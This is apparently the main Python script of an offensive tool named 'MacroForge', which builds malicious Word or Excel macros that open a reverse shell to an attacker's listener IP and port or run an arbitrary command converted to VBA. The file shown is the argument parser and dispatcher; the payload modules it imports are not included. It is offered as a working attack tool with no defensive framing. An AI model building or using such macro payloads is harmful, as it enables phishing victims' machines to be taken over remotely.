import argparse
from payloads.Rev import revshell
from payloads.Excel import payloadExcel
from payloads.Word import payloadWord
from utils.vba_synthax import convertToVbaSynthax

def parse_args():
    import argparse  

    def build_arg_parser():
        p = argparse.ArgumentParser(
            prog="MacroForge",
            description="Generate reverse shell and custom commands for Excel / Word macros. Use interactive mode if no args supplied."
        )
        p.add_argument("--file", choices=["Word", "Excel"],type=str.capitalize, help="Target file type")
        p.add_argument("--mode", choices=["Revshell", "Cmd"],type=str.capitalize, help="Operation mode")
        p.add_argument("--ip", help="Listener IP (for revshell)")
        p.add_argument("--port", help="Listener port (for revshell)")
        p.add_argument("--payload", help="Payload string / command (for 'cmd' modes)")
        p.add_argument("--yes", "-y", action="store_true", help="Skip prompts")
        return p

    parser = build_arg_parser()
    args = parser.parse_args()

    if args.mode == "Revshell":
        if not (args.ip and args.port):
            parser.error("--mode revshell requires --ip and --port")
        else:
            if args.file == "Excel":
                revshell("Excel", args.ip, args.port)
            elif args.file == "Word":
                revshell("Word", args.ip, args.port)

    elif args.mode == "Cmd":
        if not args.payload:
            parser.error("--mode cmd requires --payload")
        else:
            if args.file == "Excel":
                payload = convertToVbaSynthax(args.payload)
                payloadExcel(payload)
            elif args.file == "Word":
                payload = convertToVbaSynthax(args.payload)
                payloadWord(payload)
